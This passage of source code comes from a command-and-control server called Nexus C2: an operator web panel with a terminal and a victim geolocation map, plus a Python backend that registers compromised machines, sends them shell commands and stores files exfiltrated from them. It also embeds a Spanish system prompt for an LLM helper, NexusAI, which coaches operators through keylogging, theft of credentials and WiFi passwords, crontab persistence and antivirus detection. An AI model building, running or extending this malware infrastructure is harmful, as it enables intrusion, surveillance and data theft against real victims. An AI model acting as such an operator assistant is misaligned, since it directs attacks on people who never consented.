  const b=document.getElementById('term-body');
  String(text).split('\\n').forEach(line=>{
    const d=document.createElement('div');
    d.className='tl '+cls;d.textContent=line;b.appendChild(d);
  });
  b.scrollTop=b.scrollHeight;
}

function openTerm(id){
  document.getElementById('term-title').textContent=id.slice(0,18).toUpperCase();
  document.getElementById('term-prompt').textContent=id.slice(0,8)+'@nexus~$ ';
  document.getElementById('term-body').innerHTML='';
  tprint('connected → '+id,'sys');
  tprint('type !help · use ? Ayuda for plugin reference','sys');
  tprint('','sys');
  document.getElementById('terminal').classList.add('open');
  tinp.disabled=false;tinp.focus();
}

// ── Input handling ─────────────────────────────────────────────────────────
const tinp=document.getElementById('term-input');
tinp.addEventListener('keydown',e=>{
  if(e.key==='ArrowUp'){
    e.preventDefault();
    if(histIdx<cmdHist.length-1){histIdx++;tinp.value=cmdHist[cmdHist.length-1-histIdx];
      setTimeout(()=>tinp.setSelectionRange(tinp.value.length,tinp.value.length),0);}
  }else if(e.key==='ArrowDown'){
    e.preventDefault();
    if(histIdx>0){histIdx--;tinp.value=cmdHist[cmdHist.length-1-histIdx];}
    else{histIdx=-1;tinp.value='';}
  }else if(e.key==='Enter'){sendCmd();
  }else if(e.key==='l'&&e.ctrlKey){e.preventDefault();document.getElementById('term-body').innerHTML='';}
});

async function sendCmd(){
  const cmd=tinp.value.trim();
  if(!cmd||!sel||waitTask)return;
  if(!cmdHist.length||cmdHist[cmdHist.length-1]!==cmd)cmdHist.push(cmd);
  histIdx=-1;
  tprint(document.getElementById('term-prompt').textContent.trim()+' '+cmd,'cmd');
  tinp.value='';tinp.disabled=true;
  try{
    const r=await fetch('/agents/'+sel+'/task',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cmd})});
    const b=await r.json();
    if(r.status===429){tprint('Error: cola llena','err');tinp.disabled=false;return;}
    if(!r.ok){tprint('Error: '+(b.error||r.status),'err');tinp.disabled=false;return;}
    waitTask=b.task_id;
    let polls=0;
    const pid=setInterval(async()=>{
      polls++;
      try{
        const res=await fetch('/agents/'+sel+'/results');
        const data=await res.json();
        const found=data.find(x=>x.task_id===waitTask);
        if(found||polls>24){
          clearInterval(pid);waitTask=null;
          if(!found)tprint('timeout — sin respuesta del agente','err');
          tinp.disabled=false;tinp.focus();refreshResults();
        }
      }catch(e){}
    },2000);
  }catch(e){tprint('Error de red: '+e.message,'err');tinp.disabled=false;}
}

// ── Agents & refresh ───────────────────────────────────────────────────────
async function refresh(){
  try{
    const r=await fetch('/agents');agents=await r.json();
    const on=agents.filter(a=>a.status==='online').length;
    document.getElementById('hdr-count').textContent=on+'/'+agents.length+' online';
    document.getElementById('agent-rows').innerHTML=agents.length?agents.map(a=>
      `<tr onclick="pick('${a.agent_id}')"${a.agent_id===sel?' class="selected"':''}>
      <td><span class="dot ${a.status}"></span>${a.status}</td>
      <td style="color:#00ff41;font-weight:600">${a.username||a.agent_id.slice(0,8)}</td>
      <td style="color:#c0c0e0">${a.hostname||'—'}</td>
      <td style="font-size:.78em;color:#8888b8">${a.os_name||'—'}</td>
      <td>${jBar(a.last_seen,a.status)}</td></tr>`
    ).join(''):'<tr><td colspan="5" class="empty">Sin agentes registrados</td></tr>';
    document.getElementById('st-left').textContent=on+' agente'+(on!==1?'s':'')+' online';
    document.getElementById('st-right').textContent=new Date().toLocaleTimeString();
  }catch(e){document.getElementById('st-left').textContent='Sin conexión';}
}

async function pick(id){
  if(id===sel)return;
  waitTask=null;sel=id;cmdHist=[];histIdx=-1;
  document.getElementById('res-agent').textContent=id.toUpperCase();
  openTerm(id);
  await refreshResults();refresh();
}

async function refreshResults(){
  if(!sel)return;
  try{
    const r=await fetch('/agents/'+sel+'/results');
    const data=await r.json();
    document.getElementById('res-count').textContent=data.length?'('+data.length+')':''
    if(!data.length){document.getElementById('pane-res').innerHTML='<div class="empty">Sin resultados aún</div>';return;}
    document.getElementById('pane-res').innerHTML=[...data].reverse().map(r=>
      '<div class="r-entry">'+
      '<div class="r-meta"><b>'+(r.task_id||'?').slice(0,8)+'</b> &nbsp; exit <span class="'+(r.exit_code===0?'ok':'errc')+'">'+r.exit_code+'</span> &nbsp; '+ts2s(r.ts)+'</div>'+
      (r.stdout?'<div class="r-out">'+esc(r.stdout.trimEnd())+'</div>':'')+
      (r.stderr?'<div class="r-err">'+esc(r.stderr.trimEnd())+'</div>':'')+
      '</div>'
    ).join('');
  }catch(e){}
}

function runPlugin(cmd){if(!sel||waitTask)return;tinp.value=cmd;sendCmd();}
function fillInput(p){if(!sel)return;tinp.value=p;tinp.focus();tinp.setSelectionRange(tinp.value.length,tinp.value.length);}
function pickShell(el){const cmd=el.value;el.value='';if(!cmd||!sel||waitTask)return;tinp.value=cmd;sendCmd();}

// Init
setOS('linux');
refresh();
setInterval(refresh,3000);
setInterval(()=>{if(sel&&!waitTask)refreshResults();},5000);

// ── Tabs ──────────────────────────────────────────────────────────────
function switchTab(name){
  document.getElementById('pane-res').style.display = name==='res'?'':'none';
  document.getElementById('pane-map').style.display = name==='map'?'':'none';
  document.getElementById('tab-res').classList.toggle('active', name==='res');
  document.getElementById('tab-map').classList.toggle('active', name==='map');
  if(name==='map'){ initMap(); pollGeo(); }
}

// ── Victim map ────────────────────────────────────────────────────────
let _map = null, _markers = {}, _geoInterval = null;

function initMap(){
  if(_map) return;
  _map = L.map('victim-map', {
    center:[20,0], zoom:2,
    zoomControl:false,
    attributionControl:false,
    zoomSnap:0.5,
    wheelPxPerZoomLevel:120,
  });
  L.control.zoom({position:'bottomright'}).addTo(_map);
  L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
    maxZoom: 19,
    attribution: ''
  }).addTo(_map);
}

function pollGeo(){
  if(_geoInterval) return;
  fetchGeo();
  _geoInterval = setInterval(fetchGeo, 5000);
}

async function fetchGeo(){
  if(!_map) return;
  try{
    const r = await fetch('/geo');
    const list = await r.json();
    const seen = new Set();
    for(const e of list){
      seen.add(e.agent_id);
      const key = e.agent_id;
      const label = `<span style="color:#00ff41;font-weight:600">${e.username||e.agent_id.slice(0,8)}</span>
        <br><span style="color:#8888b8">${e.hostname||''}</span>
        <br><span style="color:#6666a0">${e.os_name||''}</span>
        <br><span style="color:#556655">${e.city}, ${e.country}</span>
        <br><span style="color:#334433;font-size:.85em">${e.ip}</span>
        <br><span class="dot ${e.status}" style="margin-right:4px"></span>${e.status}`;
      if(_markers[key]){
        _markers[key].setPopupContent(label);
      } else {
        const icon = L.divIcon({className:'',html:'<div style="position:relative;width:18px;height:18px"><div class="victim-pin"></div></div>',iconSize:[18,18],iconAnchor:[9,9]});
        const m = L.marker([e.lat,e.lon],{icon})
          .bindPopup(label,{className:'victim-popup',maxWidth:220})
          .addTo(_map);
        m.openPopup();
        _markers[key] = m;
      }
    }
    // quita agentes que ya no están
    for(const k of Object.keys(_markers)){
      if(!seen.has(k)){ _map.removeLayer(_markers[k]); delete _markers[k]; }
    }
  }catch(_){}
}

// ── NexusAI floating widget ───────────────────────────────────────────
let _aiHistory = [];

function aiToggle(){
  const w = document.getElementById('ai-widget');
  w.classList.toggle('open');
  if(w.classList.contains('open')) document.getElementById('ai-input').focus();
}

function aiMarkdown(text){
  // Renderiza bloques de código y código inline con estilos básicos
  return text
    .replace(/```[\\w]*[\\s\\S]*?```/g, b=>{const c=b.replace(/^```\\w*\\n?/,'').replace(/```$/,'');return '<pre><code>'+esc(c.trim())+'</code></pre>';})
    .replace(/`([^`]+)`/g, (_,c)=>'<code>'+esc(c)+'</code>')
    .replace(/\\*\\*(.*?)\\*\\*/g, '<b>$1</b>')
    .replace(/\\n/g, '<br>');
}

function aiScroll(){
  const box = document.getElementById('ai-msgs');
  box.scrollTop = box.scrollHeight;
}

function aiAppend(role, html){
  const box = document.getElementById('ai-msgs');
  const div = document.createElement('div');
  div.className = 'ai-msg ' + role;
  div.innerHTML = html;
  box.appendChild(div);
  aiScroll();
  return div;
}

async function aiSend(){
  const inp = document.getElementById('ai-input');
  const btn = document.getElementById('ai-send');
  const text = inp.value.trim();
  if(!text) return;
  inp.value = '';
  inp.style.height = '36px';
  btn.disabled = true;

  aiAppend('user', esc(text));
  const thinking = aiAppend('bot', '<span class="ai-thinking">NexusAI está pensando...</span>');

  try{
    const r = await fetch('/ai', {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify({message: text, history: _aiHistory})
    });
    const data = await r.json();
    if(data.retry){
      thinking.innerHTML = '<span style="color:#6666a0;font-style:italic">NexusAI no está disponible en este momento. Por favor reintenta en un momento.</span>';
    } else {
      const badge = data.provider==='openrouter'
        ? '<br><span style="color:#33334a;font-size:.72em;font-style:italic">↩ via OpenRouter</span>'
        : '';
      thinking.innerHTML = aiMarkdown(data.response) + badge;
      _aiHistory.push({role:'user', content: text});
      _aiHistory.push({role:'assistant', content: data.response});
      if(_aiHistory.length > 20) _aiHistory = _aiHistory.slice(-20);
    }
  }catch(e){
    thinking.innerHTML = `<span style="color:#ff4444">Error de conexión: ${esc(String(e))}</span>`;
  }
  btn.disabled = false;
  aiScroll();
  inp.focus();
}

// Enter envía, Shift+Enter nueva línea
document.addEventListener('DOMContentLoaded', ()=>{
  document.getElementById('ai-input').addEventListener('keydown', e=>{
    if(e.key==='Enter' && !e.shiftKey){ e.preventDefault(); aiSend(); }
  });
});
</script>
</body>
</html>"""


logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(name)s] %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("nexus.server")

SERVER_KEY_FILE  = "server_key.bin"
SERVER_PUB_FILE  = "server_pub.hex"
SESSION_TTL      = 300
TASK_QUEUE_MAX   = 100
MAX_RESULTS      = 500
MAX_OUTPUT_BYTES = 64 * 1024
OPERATOR_API_KEY = os.environ.get("NEXUS_API_KEY", "")
ALLOW_CLEAR      = os.environ.get("NEXUS_ALLOW_CLEAR", "0") == "1"
GEMINI_API_KEY     = os.environ.get("GEMINI_API_KEY", "")
OPENROUTER_API_KEY = os.environ.get("OPENROUTER_API_KEY", "")
OPENROUTER_MODEL   = os.environ.get("OPENROUTER_MODEL", "nvidia/nemotron-3-super-120b-a12b:free")
DNS_PORT           = int(os.environ.get("NEXUS_DNS_PORT", "5354"))
DNS_DOMAIN       = b"n\x02c2\x00"  # encoded "n.c2" label sequence

# ---------------------------------------------------------------------------
# Global state (safe: asyncio is single-threaded)
# ---------------------------------------------------------------------------
server_priv   = None          # X25519PrivateKey — loaded at startup
sessions: dict = {}           # session_id_hex -> SessionState
agents:   dict = {}           # agent_id -> AgentState
results:  dict = {}           # agent_id -> [ResultEntry]
tasks:    dict = {}           # agent_id -> asyncio.Queue (PENDING)
inflight: dict = {}           # agent_id -> {task_id -> {task, dispatched_at, timeout_s}}
_geo:     dict = {}           # agent_id -> {lat, lon, city, country, ip}


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _truncate(s: str) -> str:
    encoded = s.encode("utf-8", errors="replace")
    if len(encoded) <= MAX_OUTPUT_BYTES:
        return s
    return encoded[:MAX_OUTPUT_BYTES].decode("utf-8", errors="replace") + "\n[truncated]"


@web.middleware
async def _operator_auth(request: web.Request, handler):
    """Require X-Api-Key only on /agents/* (operator REST API) when NEXUS_API_KEY is set.
    POST / and GET /ws are agent protocol routes — never auth-gated."""
    if OPERATOR_API_KEY and request.path.startswith("/agents"):
        if request.headers.get("X-Api-Key", "") != OPERATOR_API_KEY:
            return web.json_response({"error": "unauthorized"}, status=401)
    return await handler(request)


class SessionState:
    def __init__(self, session_id: bytes, chacha, srv_nonce):
        self.session_id       = session_id
        self.chacha           = chacha
        self.srv_nonce        = srv_nonce
        self.agent_id         = None
        self.last_seen        = time.time()
        self.encrypted        = chacha is not None
        self.last_agent_nonce = -1   # anti-replay: highest agent nonce seen

    def check_nonce(self, frame: bytes) -> None:
        """Raise ValueError if the frame nonce is a replay (≤ last seen)."""
        nonce_int = int.from_bytes(frame[1:13], "little")
        if nonce_int <= self.last_agent_nonce:
            raise ValueError(
                f"replay: nonce {nonce_int} ≤ last seen {self.last_agent_nonce}"
            )
        self.last_agent_nonce = nonce_int


_AGENT_ID_RE = re.compile(r'^[a-zA-Z0-9_-]{1,64}$')

def _validate_agent_id(agent_id: str) -> bool:
    return bool(agent_id) and bool(_AGENT_ID_RE.match(agent_id))


def _ensure_agent(agent_id: str, ip: str = "") -> None:
    is_new = agent_id not in agents
    if is_new:
        agents[agent_id] = {
            "agent_id":      agent_id,
            "last_seen":     time.time(),
            "status":        "online",
            "pending_tasks": 0,
            "inflight_tasks": 0,
            "hostname":      "",
            "username":      "",
            "os_name":       "",
        }
        results[agent_id]  = []
        tasks[agent_id]    = asyncio.Queue(maxsize=TASK_QUEUE_MAX)
        inflight[agent_id] = {}
        log.info("NEW   agent_id=%.8s", agent_id)
        if ip and agent_id not in _geo:
            asyncio.ensure_future(_geolocate(agent_id, ip))
    else:
        agents[agent_id]["last_seen"] = time.time()
        agents[agent_id]["status"]    = "online"


def _dispatch_task(agent_id: str, task: dict, frame_builder) -> bytes:
    """Move task from PENDING → DISPATCHED (inflight). Returns the task frame."""
    agents[agent_id]["pending_tasks"] = max(0, agents[agent_id]["pending_tasks"] - 1)
    inflight.setdefault(agent_id, {})[task["task_id"]] = {
        "task":         task,
        "dispatched_at": time.time(),
        "timeout_s":    task.get("timeout_s", 30),
    }
    agents[agent_id]["inflight_tasks"] = len(inflight[agent_id])
    log.info("TASK   agent_id=%.8s task_id=%.8s cmd=%r [DISPATCHED]",
             agent_id, task["task_id"], task["cmd"])
    return frame_builder(task)


def _complete_task(agent_id: str, task_id: str) -> None:
    """Move task from DISPATCHED → COMPLETE (remove from inflight)."""
    if agent_id in inflight and task_id in inflight[agent_id]:
        del inflight[agent_id][task_id]
        agents[agent_id]["inflight_tasks"] = len(inflight[agent_id])


# ---------------------------------------------------------------------------
# Nexus protocol handler (POST /)
# ---------------------------------------------------------------------------

async def handle_nexus(request: web.Request) -> web.Response:
    body           = await request.read()
    session_id_hex = request.headers.get("X-Session-Id")
    client_ip      = request.headers.get("X-Forwarded-For", request.remote or "").split(",")[0].strip()

    if not body:
        return web.Response(
            body=pack_clear(MSG_ERROR), status=400,
            content_type="application/octet-stream",
        )

    # ── Encrypted session (Fase 3+) ──────────────────────────────────────────
    if session_id_hex and session_id_hex in sessions:
        sess = sessions[session_id_hex]
        if sess.encrypted:
            try:
                msg_type, payload = parse_frame(body, sess.chacha)
            except Exception as exc:
                log.warning("decrypt failed session=%.8s: %s", session_id_hex, exc)
                return web.Response(
                    body=pack_clear(MSG_ERROR), status=401,
                    content_type="application/octet-stream",
                )
            try:
                sess.check_nonce(body)
            except ValueError as exc:
                log.warning("REPLAY blocked session=%.8s: %s", session_id_hex, exc)
                return web.Response(
                    body=pack_clear(MSG_ERROR), status=400,
                    content_type="application/octet-stream",
                )
            return await _dispatch_encrypted(msg_type, payload, sess, session_id_hex, client_ip)

    # ── Clear frames: HELLO always allowed; BEACON/RESULT only if NEXUS_ALLOW_CLEAR=1 ──
    msg_type, payload = unpack_clear(body)
    name = MSG_NAMES.get(msg_type, f"0x{msg_type:02x}")

    if msg_type == MSG_HELLO:
        return await _handle_hello(body)

    if not ALLOW_CLEAR:
        log.warning("clear frame type=%s rejected (set NEXUS_ALLOW_CLEAR=1 to enable)", name)
        return web.Response(
            body=pack_clear(MSG_ERROR), status=400,
            content_type="application/octet-stream",
        )

    if msg_type == MSG_BEACON:
        return await _handle_beacon_clear(payload, client_ip)

    if msg_type == MSG_RESULT:
        return await _handle_result_clear(payload)

    log.warning("unknown type=%s len=%d", name, len(body))
    return web.Response(
        body=pack_clear(MSG_ERROR), status=400,
        content_type="application/octet-stream",
    )


async def _handle_hello(body: bytes) -> web.Response:
    """Fase 3: ECDH handshake."""
    try:
        welcome, session_id, session_key, chacha, srv_nonce = \
            server_process_hello(body, server_priv)
    except Exception as exc:
        log.error("HELLO error: %s", exc)
        return web.Response(
            body=pack_clear(MSG_ERROR), status=400,
            content_type="application/octet-stream",
        )
    sid_hex = session_id.hex()
    sessions[sid_hex] = SessionState(session_id, chacha, srv_nonce)
    log.info("HELLO  session=%.16s", sid_hex)
    return web.Response(body=welcome, content_type="application/octet-stream")


async def _handle_beacon_clear(payload: bytes, client_ip: str = "") -> web.Response:
    """Fase 1-2: BEACON in clear — parse JSON, register agent, return NOP or TASK."""
    try:
        data     = json.loads(payload.decode("utf-8"))
        agent_id = data.get("agent_id", "")
    except Exception:
        agent_id = ""
        data     = {}

    if not _validate_agent_id(agent_id):
        log.warning("BEACON with invalid agent_id=%r — ignored", agent_id)
        return web.Response(body=pack_clear(MSG_ERROR), status=400,
                            content_type="application/octet-stream")

    _ensure_agent(agent_id, client_ip)
    if data.get("hostname"):
        agents[agent_id]["hostname"] = data["hostname"]
    if data.get("username"):
        agents[agent_id]["username"] = data["username"]
    if data.get("os"):
        agents[agent_id]["os_name"] = data["os"]
    log.info("BEACON agent_id=%.8s ts=%s", agent_id, data.get("ts", "?"))

    q = tasks.get(agent_id)
    if q and not q.empty():
        try:
            task  = q.get_nowait()
            frame = _dispatch_task(agent_id, task,
                        lambda t: pack_clear(MSG_TASK, json.dumps(t).encode()))
            return web.Response(body=frame, content_type="application/octet-stream")
        except asyncio.QueueEmpty:
            pass

    return web.Response(body=pack_clear(MSG_NOP), content_type="application/octet-stream")


async def _handle_result_clear(payload: bytes) -> web.Response:
    """Fase 2: RESULT in clear — store and log."""
    try:
        data     = json.loads(payload.decode("utf-8"))
        agent_id = data.get("agent_id", "")
    except Exception:
        data     = {}
        agent_id = ""

    if not _validate_agent_id(agent_id):
        return web.Response(body=pack_clear(MSG_ERROR), status=400,
                            content_type="application/octet-stream")

    data["stdout"] = _truncate(data.get("stdout", ""))
    data["stderr"] = _truncate(data.get("stderr", ""))

    _ensure_agent(agent_id)
    task_id = data.get("task_id", "?")
    _complete_task(agent_id, task_id)
    log.info("RESULT agent_id=%.8s task_id=%.8s exit=%s [COMPLETE]",
             agent_id, task_id, data.get("exit_code", "?"))

    if agent_id in results:
        bucket = results[agent_id]
        bucket.append(data)
        if len(bucket) > MAX_RESULTS:
            del bucket[0]

    return web.Response(body=pack_clear(MSG_NOP), content_type="application/octet-stream")


async def _dispatch_encrypted(
    msg_type: int, payload: bytes, sess: "SessionState", sid_hex: str, client_ip: str = ""
) -> web.Response:
    """Fase 3+: handle decrypted payload."""
    sess.last_seen = time.time()

    if msg_type == MSG_BEACON:
        try:
            data     = json.loads(payload.decode("utf-8"))
            agent_id = data.get("agent_id")
        except Exception:
            agent_id = None
            data     = {}

        if agent_id and not _validate_agent_id(agent_id):
            agent_id = None
        if agent_id and sess.agent_id is None:
            sess.agent_id = agent_id
            _ensure_agent(agent_id, client_ip)
            log.info("BEACON(enc) agent_id=%.8s (first, session=%.8s)", agent_id, sid_hex)
        elif agent_id:
            _ensure_agent(agent_id, client_ip)
            log.info("BEACON(enc) agent_id=%.8s", agent_id)
        if agent_id and agent_id in agents:
            if data.get("hostname"):
                agents[agent_id]["hostname"] = data["hostname"]
            if data.get("username"):
                agents[agent_id]["username"] = data["username"]
            if data.get("os"):
                agents[agent_id]["os_name"] = data["os"]

        q = tasks.get(agent_id or "")
        if q and not q.empty():
            try:
                task = q.get_nowait()
                raw  = _dispatch_task(agent_id, task, lambda t: build_frame(
                    MSG_TASK, json.dumps(t).encode("utf-8"),
                    sess.chacha, sess.srv_nonce,
                ))
                return web.Response(body=raw, content_type="application/octet-stream")
            except asyncio.QueueEmpty:
                pass

        nop = build_frame(MSG_NOP, b"", sess.chacha, sess.srv_nonce)
        return web.Response(body=nop, content_type="application/octet-stream")

    if msg_type == MSG_RESULT:
        try:
            data     = json.loads(payload.decode("utf-8"))
            agent_id = sess.agent_id or data.get("agent_id", "")
        except Exception:
            data     = {}
            agent_id = sess.agent_id or ""

        if not _validate_agent_id(agent_id):
            nop = build_frame(MSG_NOP, b"", sess.chacha, sess.srv_nonce)
            return web.Response(body=nop, content_type="application/octet-stream")

        data["stdout"] = _truncate(data.get("stdout", ""))
        data["stderr"] = _truncate(data.get("stderr", ""))

        _ensure_agent(agent_id)
        task_id = data.get("task_id", "?")
        _complete_task(agent_id, task_id)
        log.info("RESULT(enc) agent_id=%.8s task_id=%.8s exit=%s [COMPLETE]",
                 agent_id, task_id, data.get("exit_code", "?"))
        bucket = results.setdefault(agent_id, [])
        bucket.append(data)
        if len(bucket) > MAX_RESULTS:
            del bucket[0]
        nop = build_frame(MSG_NOP, b"", sess.chacha, sess.srv_nonce)
        return web.Response(body=nop, content_type="application/octet-stream")

    log.warning("unexpected encrypted type=0x%02x session=%.8s", msg_type, sid_hex)
    return web.Response(
        body=pack_clear(MSG_ERROR), status=400,
        content_type="application/octet-stream",
    )


# ---------------------------------------------------------------------------
# Operator REST API
# ---------------------------------------------------------------------------

async def api_list_agents(request: web.Request) -> web.Response:
    out = [
        {
            "agent_id":      a["agent_id"],
            "last_seen":     a["last_seen"],
            "status":        a["status"],
            "pending_tasks": a["pending_tasks"],
            "inflight_tasks": a.get("inflight_tasks", 0),
            "hostname":      a.get("hostname", ""),
            "username":      a.get("username", ""),
            "os_name":       a.get("os_name", ""),
        }
        for a in agents.values()
    ]
    return web.json_response(out)


async def api_enqueue_task(request: web.Request) -> web.Response:
    agent_id = request.match_info["agent_id"]
    if agent_id not in agents:
        return web.json_response({"error": "agent not found"}, status=404)
    try:
        body = await request.json()
    except Exception:
        return web.json_response({"error": "invalid JSON"}, status=400)
    cmd = body.get("cmd", "").strip()
    if not cmd:
        return web.json_response({"error": "missing cmd"}, status=400)
    timeout_s = max(1, min(int(body.get("timeout_s", 30)), 3600))
    task = {
        "task_id":   str(uuid.uuid4()),
        "cmd":       cmd,
        "timeout_s": timeout_s,
    }
    try:
        tasks[agent_id].put_nowait(task)
    except asyncio.QueueFull:
        return web.json_response({"error": "task queue full"}, status=429)
    agents[agent_id]["pending_tasks"] += 1
    log.info("ENQUEUE agent_id=%.8s task_id=%.8s cmd=%r",
             agent_id, task["task_id"], cmd)
    return web.json_response({"task_id": task["task_id"], "status": "PENDING"})


async def api_get_results(request: web.Request) -> web.Response:
    agent_id = request.match_info["agent_id"]
    if agent_id not in results:
        return web.json_response({"error": "agent not found"}, status=404)
    return web.json_response(results[agent_id])


async def api_exfil_receive(request: web.Request) -> web.Response:
    """POST /exfil — agente sube un archivo al servidor C2."""
    try:
        body = await request.json()
    except Exception:
        return web.json_response({"error": "invalid JSON"}, status=400)

    agent_id = body.get("agent_id", "unknown")
    raw_name  = os.path.basename(body.get("filename", "file"))
    filename  = raw_name.lstrip(".") or "file"   # evita path traversal con ".." o ".hidden"
    data_b64  = body.get("data", "")

    if not filename or not data_b64:
        return web.json_response({"error": "filename and data required"}, status=400)

    try:
        data = base64.b64decode(data_b64)
    except Exception:
        return web.json_response({"error": "invalid base64"}, status=400)

    dest_dir = os.path.join("exfil_files", agent_id[:8])
    os.makedirs(dest_dir, exist_ok=True)
    dest_path = os.path.join(dest_dir, filename)
    with open(dest_path, "wb") as f:
        f.write(data)

    abs_path = os.path.abspath(dest_path)
    log.info("EXFIL agent_id=%.8s file=%s size=%d → %s", agent_id, filename, len(data), abs_path)
    return web.json_response({"status": "ok", "saved": dest_path, "size": len(data)})


async def api_exfil_list(request: web.Request) -> web.Response:
    """GET /exfil — operador lista los archivos exfiltrados."""
    files = []
    root = "exfil_files"
    if os.path.isdir(root):
        for agent_dir in sorted(os.listdir(root)):
            agent_path = os.path.join(root, agent_dir)
            if not os.path.isdir(agent_path):
                continue
            for fname in sorted(os.listdir(agent_path)):
                fpath = os.path.join(agent_path, fname)
                files.append({
                    "agent_id": agent_dir,
                    "filename": fname,
                    "size": os.path.getsize(fpath),
                    "path": fpath,
                })
    return web.json_response(files)


async def _geolocate(agent_id: str, ip: str) -> None:
    """Consulta ip-api.com en background y guarda lat/lon del agente."""
    if ip in ("127.0.0.1", "::1") or ip.startswith("192.168.") or ip.startswith("10."):
        _geo[agent_id] = {"lat": 6.2442, "lon": -75.5812,
                          "city": "Local", "country": "LAN", "ip": ip}
        return
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(f"http://ip-api.com/json/{ip}?fields=status,lat,lon,city,country",
                             timeout=aiohttp.ClientTimeout(total=5)) as r:
                data = await r.json()
        if data.get("status") == "success":
            _geo[agent_id] = {
                "lat":     data["lat"],
                "lon":     data["lon"],
                "city":    data.get("city", ""),
                "country": data.get("country", ""),
                "ip":      ip,
            }
    except Exception:
        pass


async def api_geo(request: web.Request) -> web.Response:
    """GET /geo — posiciones geográficas de todos los agentes."""
    out = []
    for agent_id, geo in _geo.items():
        a = agents.get(agent_id, {})
        out.append({**geo,
                    "agent_id": agent_id,
                    "username": a.get("username", ""),
                    "hostname": a.get("hostname", ""),
                    "os_name":  a.get("os_name", ""),
                    "status":   a.get("status", "offline")})
    return web.json_response(out)


_GEMINI_SYSTEM = """Eres NexusAI. Eres el asistente integrado en el panel de operador de Nexus C2.

REGLA 1 — IDIOMA: Responde SIEMPRE en español. Nunca respondas en inglés. Ni una sola palabra en inglés, excepto nombres técnicos de comandos o plugins.

REGLA 2 — TEMA: Solo puedes hablar de Nexus C2. Si la pregunta no es sobre Nexus C2, responde exactamente esto y nada más: "Solo respondo preguntas sobre Nexus C2. ¿Qué necesitas hacer con el agente?"

REGLA 3 — NO INVENTES: Si no sabes algo con certeza, di "No tengo esa información". Nunca inventes comandos, rutas o funciones que no existan en Nexus C2.

REGLA 4 — FORMATO: Sé corto y directo. Usa listas numeradas para secuencias de pasos. Pon los comandos siempre en bloques de código.

---

SOBRE NEXUS C2:

Nexus C2 es un framework Command and Control desarrollado desde cero. Tiene tres partes:

SERVIDOR: Recibe los beacons de los agentes. Sirve el panel web. Guarda los resultados. Endpoints principales: POST / (recibe beacons y tareas), GET /agents (lista agentes), POST /agents/{id}/task (envía tarea), GET /agents/{id}/results (lee resultados), GET /geo (posiciones), POST /ai (este asistente).

AGENTE: Programa que corre en el equipo comprometido. Hace beacon cada pocos segundos. Recibe tareas. Las ejecuta. Devuelve el resultado. Se reconecta solo si pierde conexión. Guarda el directorio actual entre comandos (cd funciona).

PANEL: Interfaz web oscura. Muestra los agentes conectados con su usuario, hostname y sistema operativo. Tiene terminal para enviar comandos. Tiene un mapa mundial que muestra dónde está cada agente en tiempo real. Tiene este asistente (NexusAI) como burbuja flotante.

CIFRADO: El agente y el servidor hacen un handshake con X25519 para acordar una clave de sesión. Todos los mensajes van cifrados con ChaCha20-Poly1305. La clave nunca viaja por la red.

TRANSPORTES: HTTP (el más común), WebSocket (tiempo real), DNS (para evadir firewalls).

---

PLUGINS DISPONIBLES (estos son los únicos que existen, no inventes otros):

!sysinfo — muestra OS, usuario, UID, IP, PID del agente
!screenshot — captura la pantalla del equipo comprometido
!download <url> <ruta> — descarga un archivo al equipo comprometido
!persist — instala el agente en crontab para que sobreviva reinicios
!cat <ruta> — lee un archivo o lista una carpeta
!clip read — lee el portapapeles
!clip write <texto> — escribe en el portapapeles
!exfil <ruta> — sube un archivo del equipo al servidor C2
!keylog start — inicia captura de teclado en segundo plano
!keylog dump — muestra lo capturado hasta ahora
!keylog stop — detiene la captura
!mimikatz — extrae credenciales guardadas en Linux (shadow, SSH keys, historial bash)
!nmcli status — estado de la red
!nmcli wifi — redes WiFi cercanas
!nmcli saved — redes WiFi guardadas
!nmcli passwords — contraseñas WiFi guardadas
!nmcli ifaces — interfaces de red activas
!unhook — detecta antivirus, EDR y debuggers activos
!help — lista todos los plugins

Además de los plugins, puedes enviar cualquier comando shell (ls, ps aux, whoami, cat /etc/passwd, etc.).

---

EJEMPLOS DE CÓMO RESPONDER:

Pregunta: "¿Qué hago primero cuando tengo un agente nuevo?"
Respuesta:
1. Ejecuta `!sysinfo` para conocer el sistema.
2. Ejecuta `ps aux` para ver los procesos corriendo.
3. Ejecuta `!nmcli ifaces` para ver la red.
4. Ejecuta `!unhook` para saber si hay antivirus activo.

Pregunta: "¿Cómo persisto el acceso?"
Respuesta:
Ejecuta `!persist`. Esto agrega el agente al crontab del usuario actual para que se reinicie automáticamente.

Pregunta: "¿Cuánto es 2+2?"
Respuesta:
Solo respondo preguntas sobre Nexus C2. ¿Qué necesitas hacer con el agente?

Pregunta: "¿Cómo funciona el cifrado?"
Respuesta:
El agente y el servidor hacen un handshake X25519 para calcular una clave compartida sin transmitirla. Luego cifran cada mensaje con ChaCha20-Poly1305. Si alguien intercepta el tráfico solo ve datos cifrados."""


_OPENROUTER_CHAIN = [
    "nvidia/nemotron-3-super-120b-a12b:free",
    "meta-llama/llama-3.3-70b-instruct:free",
    "google/gemma-4-27b-it:free",
    "nvidia/nemotron-nano-12b-v2-vl:free",
]


async def _call_openrouter(messages: list, model: str) -> str:
    """Llama a un modelo específico de OpenRouter. Lanza excepción si falla."""
    headers = {
        "Authorization": f"Bearer {OPENROUTER_API_KEY}",
        "Content-Type": "application/json",
        "HTTP-Referer": "https://nexus-c2",
        "X-Title": "Nexus C2",
    }
    payload = {"model": model, "messages": messages, "max_tokens": 1024, "temperature": 0.7}
    async with aiohttp.ClientSession() as s:
        async with s.post(
            "https://openrouter.ai/api/v1/chat/completions",
            json=payload, headers=headers,
            timeout=aiohttp.ClientTimeout(total=30),
        ) as r:
            data = await r.json()
    if "error" in data:
        raise RuntimeError(data["error"].get("message", "error"))
    text = data["choices"][0]["message"]["content"]
    if not text:
        raise RuntimeError("respuesta vacía")
    return text


async def api_gemini_proxy(request: web.Request) -> web.Response:
    """POST /ai — Gemini primero, luego cadena de fallback OpenRouter."""
    if not GEMINI_API_KEY and not OPENROUTER_API_KEY:
        return web.json_response({"retry": True}, status=200)
    try:
